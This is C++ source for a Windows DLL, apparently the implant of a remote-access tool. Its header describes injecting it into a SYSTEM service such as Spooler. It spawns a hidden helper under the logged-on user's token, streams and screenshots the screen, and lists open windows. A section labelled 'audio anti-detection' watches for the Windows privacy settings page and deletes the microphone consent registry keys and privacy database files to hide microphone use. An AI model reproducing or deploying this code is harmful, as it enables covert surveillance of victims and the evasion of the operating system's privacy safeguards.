/*
 * DLL entry point for injection into Windows services (e.g. Spooler)
 * Runs host logic in Session 0 as SYSTEM, spawns capture helper in user session
 *
 * Exports:
 *   DllMain          — auto-starts host thread on DLL_PROCESS_ATTACH
 *   Init             — manual start (alternative to DllMain auto-start)
 *   CaptureHelper    — rundll32-compatible capture subprocess entry
 *   Stop             — graceful shutdown
 *
 * Usage:
 *   1. Inject DLL into a Session 0 service (e.g. Spooler)
 *      → DllMain auto-starts the host
 *   2. Capture helper is spawned automatically via:
 *      rundll32.exe "C:\path\to\RemoteDesktopHost.dll",CaptureHelper <pid> <ipc_name>
 */

#ifdef BUILD_AS_DLL

#include "host.h"
#include "logger.h"
#include "capture_ipc.h"
#include "screen_capture.h"
#include "threat_scan.h"
#include <wtsapi32.h>
#include <userenv.h>
#include <mmsystem.h>
#include <avrt.h>
#include <mfapi.h>
#include <mfidl.h>
#include <mftransform.h>
#include <mferror.h>
#include <wmcodecdsp.h>
#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "userenv.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "avrt.lib")
#pragma comment(lib, "mfplat.lib")
#pragma comment(lib, "mfuuid.lib")
#pragma comment(lib, "mf.lib")
#pragma comment(lib, "ole32.lib")

// ── Forward declarations from main.cpp ──
extern void host_main_loop();
extern std::atomic<bool> g_running;
extern bool g_service_mode;
extern CaptureIpcReader* g_ipc_reader_ptr;
extern HostConfig g_config;

// ── DLL globals ──
static std::thread g_host_thread;
static std::thread g_helper_monitor;
static CaptureIpcReader g_dll_ipc_reader;
static HANDLE g_helper_process = nullptr;
static std::atomic<bool> g_dll_started{false};
HMODULE g_dll_module = nullptr;  // non-static: shared with main.cpp via extern

// Simple file logger for DLL diagnostics (no dependencies, safe anywhere)
void dll_diag(const char* msg) {
    (void)msg; // Disabled — was used for injection debugging
}

// Get this DLL's file path
static std::string get_dll_path() {
    char buf[MAX_PATH] = {};
    GetModuleFileNameA(g_dll_module, buf, MAX_PATH);
    return buf;
}

// Get directory containing this DLL
static std::string get_dll_dir() {
    std::string p = get_dll_path();
    auto pos = p.find_last_of("\\/");
    return pos != std::string::npos ? p.substr(0, pos + 1) : "";
}

// ── Spawn capture helper in user's interactive session ──
static bool spawn_helper() {
    Logger& log = Logger::get();
    dll_diag("spawn_helper: ENTER");

    // Check if helper is still running — don't respawn
    if (g_helper_process) {
        DWORD exitCode = 0;
        if (GetExitCodeProcess(g_helper_process, &exitCode) && exitCode == STILL_ACTIVE) {
            dll_diag("spawn_helper: helper still running, skip");
            return true;
        }
        // Helper died — cleanup
        dll_diag(("spawn_helper: helper dead, exitCode=" + std::to_string(exitCode)).c_str());
        CloseHandle(g_helper_process);
        g_helper_process = nullptr;
    }

    DWORD sessionId = WTSGetActiveConsoleSessionId();
    if (sessionId == 0xFFFFFFFF) {
        log.warn("No active console session");
        return false;
    }

    // Get user token
    dll_diag(("spawn_helper: WTSQueryUserToken session=" + std::to_string(sessionId)).c_str());
    HANDLE hToken = nullptr;
    if (!WTSQueryUserToken(sessionId, &hToken)) {
        log.error("WTSQueryUserToken failed, session=" + std::to_string(sessionId) +
                  " err=" + std::to_string(GetLastError()));
        return false;
    }

    HANDLE hPrimary = nullptr;
    DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, nullptr,
                     SecurityImpersonation, TokenPrimary, &hPrimary);
    CloseHandle(hToken);
    if (!hPrimary) {
        log.error("DuplicateTokenEx failed");
        return false;
    }

    // Create IPC (only once — don't destroy on respawn)
    static bool ipc_created = false;
    std::string ipcName = "rdh_" + std::to_string(GetCurrentProcessId());
    if (!ipc_created) {
        g_dll_ipc_reader.close();
        if (!g_dll_ipc_reader.create(ipcName)) {
            log.error("Failed to create IPC");
            CloseHandle(hPrimary);
            return false;
        }
        g_dll_ipc_reader.set_parent_pid(GetCurrentProcessId());
        g_dll_ipc_reader.set_fps(g_config.fps > 0 ? g_config.fps : 30);
        g_dll_ipc_reader.set_scale(g_config.scale > 0 ? g_config.scale : 100);
        g_ipc_reader_ptr = &g_dll_ipc_reader;
        ipc_created = true;
    }

    dll_diag("spawn_helper: IPC created, building cmdline...");
    // Build command: rundll32.exe "C:\path\to\RemoteDesktopHost.dll",CaptureHelper <pid> <ipc>
    std::string dllPath = get_dll_path();
    std::string cmdLine = "rundll32.exe \"" + dllPath + "\",CaptureHelper " +
                          std::to_string(GetCurrentProcessId()) + " " + ipcName;

    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    si.lpDesktop = (LPSTR)"winsta0\\default";
    PROCESS_INFORMATION pi = {};

    LPVOID pEnv = nullptr;
    CreateEnvironmentBlock(&pEnv, hPrimary, FALSE);

    dll_diag(("spawn_helper: CreateProcessAsUser cmd=" + cmdLine).c_str());
    BOOL ok = CreateProcessAsUserA(
        hPrimary, nullptr, (LPSTR)cmdLine.c_str(),
        nullptr, nullptr, FALSE,
        CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT,
        pEnv, nullptr, &si, &pi
    );

    if (pEnv) DestroyEnvironmentBlock(pEnv);
    CloseHandle(hPrimary);

    if (!ok) {
        log.error("CreateProcessAsUser failed, err=" + std::to_string(GetLastError()));
        return false;
    }

    g_helper_process = pi.hProcess;
    CloseHandle(pi.hThread);
    log.info("Capture helper spawned via rundll32, session=" + std::to_string(sessionId) +
             " PID=" + std::to_string(pi.dwProcessId));
    return true;
}

// ── Helper monitor: spawn/respawn helper ──
static void helper_monitor_func() {
    Logger& log = Logger::get();
    DWORD lastSession = 0xFFFFFFFF;
    int crashCount = 0;

    dll_diag("helper_monitor: started, waiting for streaming...");

    // Wait until streaming is requested
    extern std::atomic<bool> g_streaming;
    while (g_running) {
        if (!g_streaming) {
            Sleep(1000);
            continue;
        }

        DWORD session = WTSGetActiveConsoleSessionId();
        dll_diag(("helper_monitor: streaming active, session=" + std::to_string(session)).c_str());

        // No session
        if (session == 0xFFFFFFFF) {
            if (g_helper_process) {
                g_dll_ipc_reader.set_shutdown();
                WaitForSingleObject(g_helper_process, 3000);
                TerminateProcess(g_helper_process, 0);
                CloseHandle(g_helper_process);
                g_helper_process = nullptr;
            }
            Sleep(5000);
            continue;
        }

        // Session changed
        if (session != lastSession && g_helper_process) {
            log.info("Session changed, respawning helper");
            g_dll_ipc_reader.set_shutdown();
            WaitForSingleObject(g_helper_process, 3000);
            TerminateProcess(g_helper_process, 0);
            CloseHandle(g_helper_process);
            g_helper_process = nullptr;
        }
        lastSession = session;

        // Spawn if not running
        dll_diag("helper_monitor: checking if helper needs spawn...");
        if (!g_helper_process) {
            if (crashCount > 5) {
                log.error("Helper crashed too many times, waiting 30s");
                Sleep(30000);
                crashCount = 0;
            }
            if (!spawn_helper()) {
                Sleep(5000);
                continue;
            }
        }

        // Monitor helper
        DWORD wait = WaitForSingleObject(g_helper_process, 2000);
        if (wait == WAIT_OBJECT_0) {
            DWORD exitCode = 0;
            GetExitCodeProcess(g_helper_process, &exitCode);
            CloseHandle(g_helper_process);
            g_helper_process = nullptr;
            log.warn("Helper exited, code=" + std::to_string(exitCode));
            crashCount++;
            Sleep(1000);
        }
    }

    // Cleanup
    if (g_helper_process) {
        g_dll_ipc_reader.set_shutdown();
        WaitForSingleObject(g_helper_process, 3000);
        TerminateProcess(g_helper_process, 0);
        CloseHandle(g_helper_process);
        g_helper_process = nullptr;
    }
    g_dll_ipc_reader.close();
}

// ── Start host (called from DllMain or Init export) ──
static void start_host() {
    if (g_dll_started.exchange(true)) {
        dll_diag("start_host: already started, skipping");
        return;
    }

    dll_diag("start_host: initializing logger...");
    Logger& log = Logger::get();
    log.set_level("INFO");
    // Log to file next to DLL (not C:\)
    // log.set_file(get_dll_dir() + "RemoteDesktopHost.log"); // disabled — no log files
    log.info("=== DLL loaded, starting host (injected mode) ===");

    g_service_mode = true;
    dll_diag("start_host: service_mode=true, starting helper_monitor thread...");

    // Start helper monitor (spawns capture process in user session)
    g_helper_monitor = std::thread(helper_monitor_func);
    dll_diag("start_host: helper_monitor started, starting host_main_loop thread...");

    // Start main host logic (WebSocket, commands, streaming)
    g_host_thread = std::thread([]() {
        dll_diag("host_thread: entering host_main_loop()");
        host_main_loop();
        dll_diag("host_thread: host_main_loop() exited");
    });
    dll_diag("start_host: all threads started, returning");
}

// ── Stop host ──
static void stop_host() {
    if (!g_dll_started) return;
    Logger& log = Logger::get();
    log.info("Stopping host...");

    g_running = false;

    if (g_helper_monitor.joinable()) g_helper_monitor.join();
    if (g_host_thread.joinable()) g_host_thread.join();

    g_dll_started = false;
    log.info("Host stopped");
}

// ══════════════════════════════════════════════════
// DLL EXPORTS
// ══════════════════════════════════════════════════

extern "C" {

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        g_dll_module = hModule;
        DisableThreadLibraryCalls(hModule);

        // Bump refcount to prevent accidental FreeLibrary (but still allow explicit unload)
        HMODULE pinned = nullptr;
        GetModuleHandleExA(
            GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
            (LPCSTR)&g_dll_module, &pinned);

        // Global named mutex — survives DLL reload, prevents multiple instances system-wide
        HANDLE hMutex = CreateMutexA(nullptr, FALSE, "Global\\RDPHostDllMutex_7F3A");
        if (hMutex) {
            DWORD waitResult = WaitForSingleObject(hMutex, 0);
            if (waitResult != WAIT_OBJECT_0 && waitResult != WAIT_ABANDONED) {
                // Another instance already running — skip
                CloseHandle(hMutex);
                dll_diag("DllMain: SKIPPED (another instance running)");
                return TRUE;
            }
            // We own the mutex — don't release or close it, keep it for lifetime
        }

        // Check if we're loaded by rundll32.exe (for CaptureHelper) — don't auto-start host
        char hostExe[MAX_PATH] = {};
        GetModuleFileNameA(NULL, hostExe, MAX_PATH);
        bool isRundll32 = false;
        {
            std::string exe(hostExe);
            for (auto& c : exe) c = (char)tolower((unsigned char)c);
            isRundll32 = (exe.find("rundll32") != std::string::npos);
        }

        if (isRundll32) {
            dll_diag("DllMain: loaded by rundll32 — skip host auto-start (CaptureHelper mode)");
        } else {
            dll_diag("DllMain: ATTACH (pinned, mutex acquired) — starting host");

            CreateThread(nullptr, 0, [](LPVOID) -> DWORD {
                dll_diag("Thread: calling start_host()");
                try {
                    start_host();
                    dll_diag("Thread: start_host() returned OK");
                } catch (const std::exception& e) {
                    std::string err = "Thread: EXCEPTION: ";
                    err += e.what();
                    dll_diag(err.c_str());
                } catch (...) {
                    dll_diag("Thread: UNKNOWN EXCEPTION");
                }
                return 0;
            }, nullptr, 0, nullptr);
        }
    }
    return TRUE;
}

// Manual init (alternative to DllMain auto-start)
__declspec(dllexport) void CALLBACK Init(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    start_host();
}

// Graceful shutdown
__declspec(dllexport) void CALLBACK Stop(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    stop_host();
}

// ── ServiceMain: entry point when loaded as Windows service DLL via svchost ──
// svchost calls this when the service starts. We register a minimal service
// control handler and start the host in the background.
static SERVICE_STATUS_HANDLE g_svcStatusHandle = NULL;
static SERVICE_STATUS g_svcStatus = {};

static DWORD WINAPI SvcCtrlHandler(DWORD dwControl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext) {
    switch (dwControl) {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
        g_svcStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(g_svcStatusHandle, &g_svcStatus);
        stop_host();
        g_svcStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(g_svcStatusHandle, &g_svcStatus);
        return NO_ERROR;
    case SERVICE_CONTROL_INTERROGATE:
        return NO_ERROR;
    default:
        return ERROR_CALL_NOT_IMPLEMENTED;
    }
}

__declspec(dllexport) void WINAPI ServiceMain(DWORD dwArgc, LPWSTR* lpszArgv) {
    // Register service control handler
    g_svcStatusHandle = RegisterServiceCtrlHandlerExW(
        lpszArgv && lpszArgv[0] ? lpszArgv[0] : L"RDPHost",
        SvcCtrlHandler, NULL);
    if (!g_svcStatusHandle) return;

    // Report running
    g_svcStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    g_svcStatus.dwCurrentState = SERVICE_RUNNING;
    g_svcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    SetServiceStatus(g_svcStatusHandle, &g_svcStatus);

    // Start host (blocks until stopped)
    dll_diag("ServiceMain: starting host as Windows service");
    start_host();

    // host_main_loop returned (g_running = false) — report stopped
    g_svcStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_svcStatusHandle, &g_svcStatus);
}

// Unload: stop host + release refcounts + free DLL from memory
__declspec(dllexport) void CALLBACK Unload(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    dll_diag("Unload: stopping host and freeing DLL");
    stop_host();
    // Release global mutex so next instance can start
    HANDLE hMutex = OpenMutexA(MUTEX_ALL_ACCESS, FALSE, "Global\\RDPHostDllMutex_7F3A");
    if (hMutex) { ReleaseMutex(hMutex); CloseHandle(hMutex); }
    // Free DLL: decrement extra refcount + original LoadLibrary refcount
    HMODULE hSelf = g_dll_module;
    FreeLibrary(hSelf); // remove our extra +1 refcount
    // FreeLibraryAndExitThread on new thread to remove the LoadLibrary refcount
    CreateThread(nullptr, 0, [](LPVOID p) -> DWORD {
        Sleep(300);
        FreeLibraryAndExitThread((HMODULE)p, 0);
        return 0;
    }, (LPVOID)hSelf, 0, nullptr);
}

// ── Capture helper entry (runs in user session via rundll32) ──
// Called as: rundll32.exe "path\to\dll",CaptureHelper <parent_pid> <ipc_name>
__declspec(dllexport) void CALLBACK CaptureHelper(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    dll_diag(("CaptureHelper CALLED! cmdLine=[" + std::string(lpszCmdLine ? lpszCmdLine : "NULL") + "]").c_str());
    // Parse args from cmdLine: "<parent_pid> <ipc_name>"
    std::string args(lpszCmdLine ? lpszCmdLine : "");
    DWORD parentPid = 0;
    std::string ipcName;
    {
        size_t sp = args.find(' ');
        if (sp != std::string::npos) {
            parentPid = (DWORD)atoi(args.substr(0, sp).c_str());
            ipcName = args.substr(sp + 1);
            // Trim
            while (!ipcName.empty() && ipcName.back() == ' ') ipcName.pop_back();
        }
    }

    dll_diag(("CaptureHelper: parsed parentPid=" + std::to_string(parentPid) + " ipcName=[" + ipcName + "]").c_str());

    if (parentPid == 0 || ipcName.empty()) {
        dll_diag("CaptureHelper: INVALID ARGS, returning");
        return;
    }

    dll_diag("CaptureHelper: setting up logger...");
    Logger& log = Logger::get();
    log.set_level("INFO");
    // log.set_file("C:\\RDHostHelper.log"); // disabled — no log files
    log.info("=== Capture helper (rundll32) starting, parent=" + std::to_string(parentPid) + " ipc=" + ipcName + " ===");
    dll_diag("CaptureHelper: logger OK, opening parent process...");

    // Open parent process for death detection
    // Note: parent is SYSTEM (Spooler), helper runs as user — may lack SYNCHRONIZE rights
    HANDLE hParent = OpenProcess(SYNCHRONIZE, FALSE, parentPid);
    if (!hParent) {
        DWORD err = GetLastError();
        dll_diag(("CaptureHelper: OpenProcess failed err=" + std::to_string(err) + " for PID=" + std::to_string(parentPid)).c_str());
        // Fallback: try PROCESS_QUERY_LIMITED_INFORMATION (available even cross-session)
        hParent = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, parentPid);
        if (!hParent) {
            dll_diag("CaptureHelper: OpenProcess fallback also failed, using IPC-only death detect");
            // Continue without parent handle — rely on IPC shutdown flag instead
        }
    }

    // Open IPC
    dll_diag(("CaptureHelper: opening IPC name=[" + ipcName + "]").c_str());
    CaptureIpcWriter ipc;
    bool ok = false;
    for (int i = 0; i < 20; i++) {
        if (ipc.open(ipcName)) { ok = true; break; }
        if (i % 5 == 0) dll_diag(("CaptureHelper: IPC open attempt " + std::to_string(i) + "/20...").c_str());
        Sleep(500);
    }
    if (!ok) {
        dll_diag("CaptureHelper: FAILED to open IPC, exiting");
        log.error("Cannot open IPC: " + ipcName);
        if (hParent) CloseHandle(hParent);
        return;
    }
    dll_diag("CaptureHelper: IPC opened OK");

    // Init GDI+
    Gdiplus::GdiplusStartupInput gdipInput;
    ULONG_PTR gdipToken = 0;
    Gdiplus::GdiplusStartup(&gdipToken, &gdipInput, nullptr);

    // Init screen capture
    ScreenCapture screen;
    int scale = ipc.get_scale();
    if (scale < 10) scale = 80;
    screen.init(75, scale);

    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    timeBeginPeriod(1);

    DWORD mmcssTask = 0;
    HANDLE mmcss = AvSetMmThreadCharacteristicsW(L"Pro Audio", &mmcssTask);
    if (mmcss) AvSetMmThreadPriority(mmcss, AVRT_PRIORITY_HIGH);

    SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_DISPLAY_REQUIRED);

    int consecutiveTimeouts = 0;
    DWORD lastThreatScan = 0;
    dll_diag(("CaptureHelper: capture loop starting, scale=" + std::to_string(scale)).c_str());
    log.info("Capture loop starting, scale=" + std::to_string(scale));

    while (true) {
        // ── Threat scan every ~1.2s ──
        DWORD nowTick = GetTickCount();
        if (nowTick - lastThreatScan > 1200) {
            lastThreatScan = nowTick;
            std::vector<std::pair<std::string,std::string>> threats;
            ts_scan_all(threats);
            ipc.set_threat_list(threats);
        }

        // Parent alive? (only check if we have a valid handle with SYNCHRONIZE)
        if (hParent) {
            DWORD wr = WaitForSingleObject(hParent, 0);
            if (wr == WAIT_OBJECT_0) {
                log.info("Parent died, exiting");
                break;
            }
        }
        if (ipc.should_shutdown()) {
            log.info("Shutdown signal, exiting");
            break;
        }

        int fps = ipc.get_fps();
        if (fps < 5) fps = 30;
        if (fps > 60) fps = 60;
        int newScale = ipc.get_scale();
        if (newScale >= 10 && newScale != scale) {
            scale = newScale;
            screen.set_scale(scale);
        }

        auto frameDur = std::chrono::milliseconds(1000 / fps);
        auto t0 = std::chrono::steady_clock::now();

        ScreenCapture::RawFrame raw;
        int result = screen.capture_raw_ex(raw);
        if (result == 0) {
            consecutiveTimeouts++;
            if (consecutiveTimeouts >= 3) {
                if (screen.force_gdi_capture(raw)) result = 1;
            }
        }
        if (result == 1 && !raw.pixels.empty()) {
            consecutiveTimeouts = 0;
            // Send raw BGRA — host encoder handles NV12 conversion
            // NV12 in helper was slower (CPU-bound conversion offset IPC savings)
            ipc.write_frame(raw);
        }

        auto elapsed = std::chrono::steady_clock::now() - t0;
        if (elapsed < frameDur)
            std::this_thread::sleep_for(frameDur - elapsed);
    }

    if (mmcss) AvRevertMmThreadCharacteristics(mmcss);
    timeEndPeriod(1);
    screen.stop();
    ipc.close();
    if (hParent) CloseHandle(hParent);
    if (gdipToken) Gdiplus::GdiplusShutdown(gdipToken);
    log.info("=== Capture helper stopped ===");
}

// ── ScreenshotCapture: rundll32-compatible single-frame capture ──
// Usage: rundll32.exe "path\to\dll",ScreenshotCapture <quality> <scale> <output.jpg> <title.txt>
// Captures one screenshot, saves JPEG + window title, exits immediately.
// Runs in user session (invisible, < 1 sec), called by screenshot thread in service mode.
void CALLBACK ScreenshotCapture(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    (void)hwnd; (void)hinst; (void)nCmdShow;
    std::string args(lpszCmdLine ? lpszCmdLine : "");

    // Parse: quality scale mode output_path title_path
    // mode: 0=fullscreen, 1=active window
    std::istringstream ss(args);
    int quality = 75, scale = 100, mode = 0;
    std::string outPath, titlePath;
    ss >> quality >> scale >> mode >> outPath >> titlePath;
    if (outPath.empty()) return;

    // Enable DPI awareness for accurate screen dimensions
    SetProcessDPIAware();

    // Init GDI+
    Gdiplus::GdiplusStartupInput gdipIn;
    ULONG_PTR gdipTok = 0;
    Gdiplus::GdiplusStartup(&gdipTok, &gdipIn, nullptr);

    // Determine capture area
    int srcX = 0, srcY = 0, srcW = 0, srcH = 0;
    HWND captureWnd = NULL;

    if (mode == 1) {
        // Active window capture
        captureWnd = GetForegroundWindow();
        if (captureWnd) {
            RECT rc;
            GetWindowRect(captureWnd, &rc);
            srcX = rc.left;
            srcY = rc.top;
            srcW = rc.right - rc.left;
            srcH = rc.bottom - rc.top;
        }
    }

    if (srcW <= 0 || srcH <= 0) {
        // Fullscreen capture with virtual screen (all monitors)
        srcX = GetSystemMetrics(SM_XVIRTUALSCREEN);
        srcY = GetSystemMetrics(SM_YVIRTUALSCREEN);
        srcW = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        srcH = GetSystemMetrics(SM_CYVIRTUALSCREEN);
        if (srcW <= 0 || srcH <= 0) {
            srcX = 0; srcY = 0;
            srcW = GetSystemMetrics(SM_CXSCREEN);
            srcH = GetSystemMetrics(SM_CYSCREEN);
        }
    }

    {
        int outW = srcW * scale / 100;
        int outH = srcH * scale / 100;
        if (outW < 1) outW = srcW;
        if (outH < 1) outH = srcH;

        HDC hScreen = GetDC(NULL);
        HDC hMem = CreateCompatibleDC(hScreen);
        HBITMAP hBmp = CreateCompatibleBitmap(hScreen, outW, outH);
        SelectObject(hMem, hBmp);

        // Capture with scaling
        SetStretchBltMode(hMem, HALFTONE);
        StretchBlt(hMem, 0, 0, outW, outH, hScreen, srcX, srcY, srcW, srcH, SRCCOPY);

        // Convert to GDI+ Bitmap and save as JPEG
        Gdiplus::Bitmap bmp(hBmp, NULL);
        CLSID jpegClsid;
        {
            UINT num = 0, sz = 0;
            Gdiplus::GetImageEncodersSize(&num, &sz);
            std::vector<uint8_t> buf(sz);
            auto* encoders = (Gdiplus::ImageCodecInfo*)buf.data();
            Gdiplus::GetImageEncoders(num, sz, encoders);
            for (UINT i = 0; i < num; i++) {
                if (wcscmp(encoders[i].MimeType, L"image/jpeg") == 0) {
                    jpegClsid = encoders[i].Clsid;
                    break;
                }
            }
        }
        Gdiplus::EncoderParameters params;
        params.Count = 1;
        params.Parameter[0].Guid = Gdiplus::EncoderQuality;
        params.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
        params.Parameter[0].NumberOfValues = 1;
        ULONG q = quality;
        params.Parameter[0].Value = &q;

        // Save to memory stream → encrypt → write encrypted temp file
        IStream* pStream = nullptr;
        CreateStreamOnHGlobal(nullptr, TRUE, &pStream);
        bmp.Save(pStream, &jpegClsid, &params);
        // Get data from stream
        STATSTG stat = {};
        pStream->Stat(&stat, STATFLAG_NONAME);
        DWORD jpegSize = (DWORD)stat.cbSize.QuadPart;
        LARGE_INTEGER zero = {};
        pStream->Seek(zero, STREAM_SEEK_SET, nullptr);
        std::vector<uint8_t> jpegData(jpegSize);
        ULONG read = 0;
        pStream->Read(jpegData.data(), jpegSize, &read);
        pStream->Release();
        // Write raw JPEG (encrypted in main process, temp file is brief)
        std::ofstream fOut(outPath, std::ios::binary);
        if (fOut.is_open()) fOut.write((const char*)jpegData.data(), jpegData.size());

        DeleteObject(hBmp);
        DeleteDC(hMem);
        ReleaseDC(NULL, hScreen);
    }

    // Write window title
    if (!titlePath.empty()) {
        HWND fg = GetForegroundWindow();
        wchar_t wTitle[512] = {};
        GetWindowTextW(fg, wTitle, 512);
        int len = WideCharToMultiByte(CP_UTF8, 0, wTitle, -1, nullptr, 0, nullptr, nullptr);
        if (len > 0) {
            std::string utf8(len - 1, 0);
            WideCharToMultiByte(CP_UTF8, 0, wTitle, -1, &utf8[0], len, nullptr, nullptr);
            std::ofstream fTitle(titlePath);
            if (fTitle.is_open()) fTitle << utf8;
        }
    }

    Gdiplus::GdiplusShutdown(gdipTok);
}

// ── GetRunningApps: rundll32-compatible window title lister ──
// Usage: rundll32.exe "path\to\dll",GetRunningApps <output.txt>
// EnumWindows in user session, writes titles to file, exits.
void CALLBACK GetRunningApps(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    (void)hwnd; (void)hinst; (void)nCmdShow;
    std::string outPath(lpszCmdLine ? lpszCmdLine : "");
    // Trim whitespace
    while (!outPath.empty() && outPath.front() == ' ') outPath.erase(outPath.begin());
    while (!outPath.empty() && outPath.back() == ' ') outPath.pop_back();
    if (outPath.empty()) return;

    std::ofstream f(outPath);
    if (!f.is_open()) return;

    EnumWindows([](HWND hw, LPARAM lParam) -> BOOL {
        if (!IsWindowVisible(hw)) return TRUE;
        wchar_t title[512] = {};
        GetWindowTextW(hw, title, 512);
        if (wcslen(title) == 0) return TRUE;
        // Get process name
        DWORD pid = 0;
        GetWindowThreadProcessId(hw, &pid);
        std::string procName;
        if (pid) {
            HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
            if (hProc) {
                char exePath[MAX_PATH] = {};
                DWORD sz = MAX_PATH;
                if (QueryFullProcessImageNameA(hProc, 0, exePath, &sz)) {
                    std::string p(exePath);
                    auto pos = p.find_last_of("\\/");
                    procName = (pos != std::string::npos) ? p.substr(pos + 1) : p;
                }
                CloseHandle(hProc);
            }
        }
        // Skip system windows
        // Skip system/UWP windows by process name
        if (procName == "TextInputHost.exe" || procName == "HotKeyServiceUWP.exe" ||
            procName == "ShellExperienceHost.exe" || procName == "SearchHost.exe" ||
            procName == "StartMenuExperienceHost.exe" || procName == "LockApp.exe" ||
            procName == "SystemSettings.exe" || procName == "explorer.exe") {
            // explorer.exe with "Program Manager" title = desktop, skip
            if (procName == "explorer.exe" && wcscmp(title, L"Program Manager") == 0) return TRUE;
            if (procName != "explorer.exe") return TRUE;
        }
        // Skip NVIDIA overlay
        if (wcsstr(title, L"NVIDIA GeForce Overlay")) return TRUE;
        auto* pFile = (std::ofstream*)lParam;
        int len = WideCharToMultiByte(CP_UTF8, 0, title, -1, nullptr, 0, nullptr, nullptr);
        if (len <= 0) return TRUE;
        std::string utf8(len - 1, 0);
        WideCharToMultiByte(CP_UTF8, 0, title, -1, &utf8[0], len, nullptr, nullptr);
        // Format: process.exe|Window Title
        *pFile << procName << "|" << utf8 << "\n";
        return TRUE;
    }, (LPARAM)&f);
    f.close();
}

// ═══════════════════════════════════════════════════════════════
// AUDIO ANTI-DETECTION: SystemSettings monitoring + privacy cleanup
// Ported from AudioCoreDLL
// ═══════════════════════════════════════════════════════════════
#include <tlhelp32.h>
#include <shlobj.h>
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "crypt32.lib")

// Check if Windows Settings / Privacy & Security is open
static bool AudioCheckSystemSettings() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32W pe = {}; pe.dwSize = sizeof(pe);
    bool found = false;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"SystemSettings.exe") == 0) { found = true; break; }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    if (!found) return false;
    // Check if it has a visible window
    struct EnumData { bool visible; };
    EnumData ed = { false };
    EnumWindows([](HWND hw, LPARAM lp) -> BOOL {
        auto* d = (EnumData*)lp;
        if (!IsWindowVisible(hw)) return TRUE;
        wchar_t cls[256] = {}, title[512] = {};
        GetClassNameW(hw, cls, 256);
        GetWindowTextW(hw, title, 512);
        if (wcscmp(cls, L"ApplicationFrameWindow") == 0 && wcslen(title) > 0) {
            // Check for privacy-related keywords
            if (wcsstr(title, L"Settings") || wcsstr(title, L"Privacy") ||
                wcsstr(title, L"Microphone") || wcsstr(title, L"Параметры") ||
                wcsstr(title, L"Конфиденциальность") || wcsstr(title, L"Микрофон")) {
                d->visible = true;
                return FALSE;
            }
        }
        return TRUE;
    }, (LPARAM)&ed);
    return ed.visible;
}

// Recursively delete registry key
static void AudioDeleteRegKeyRecursive(HKEY hRoot, const wchar_t* subKey) {
    HKEY hKey = nullptr;
    if (RegOpenKeyExW(hRoot, subKey, 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS) return;
    wchar_t childName[256];
    DWORD childSize = 256;
    while (RegEnumKeyExW(hKey, 0, childName, &childSize, nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS) {
        std::wstring fullChild = std::wstring(subKey) + L"\\" + childName;
        AudioDeleteRegKeyRecursive(hRoot, fullChild.c_str());
        childSize = 256;
    }
    RegCloseKey(hKey);
    RegDeleteKeyW(hRoot, subKey);
}

// Clean microphone registry traces
static void AudioCleanMicRegistry() {
    const wchar_t* micPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone";
    AudioDeleteRegKeyRecursive(HKEY_CURRENT_USER, micPath);
    AudioDeleteRegKeyRecursive(HKEY_LOCAL_MACHINE, (std::wstring(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone")).c_str());
    // Re-create empty key so Windows doesn't complain
    HKEY hKey = nullptr;
    RegCreateKeyExW(HKEY_CURRENT_USER, micPath, 0, nullptr, 0, KEY_WRITE, nullptr, &hKey, nullptr);
    if (hKey) {
        RegSetValueExW(hKey, L"Value", 0, REG_SZ, (const BYTE*)L"Allow", 12);
        RegCloseKey(hKey);
    }
}

// Delete privacy database files
static void AudioDeletePrivacyFiles() {
    wchar_t localAppData[MAX_PATH] = {};
    SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData);
    std::wstring privDir = std::wstring(localAppData) + L"\\Microsoft\\Windows\\Privacy";
    const wchar_t* files[] = { L"PrivacyExperience.dat", L"PrivacyExperience.dat-shm", L"PrivacyExperience.dat-wal" };
    for (auto& f : files) {
        std::wstring path = privDir + L"\\" + f;
        DeleteFileW(path.c_str());
    }
}

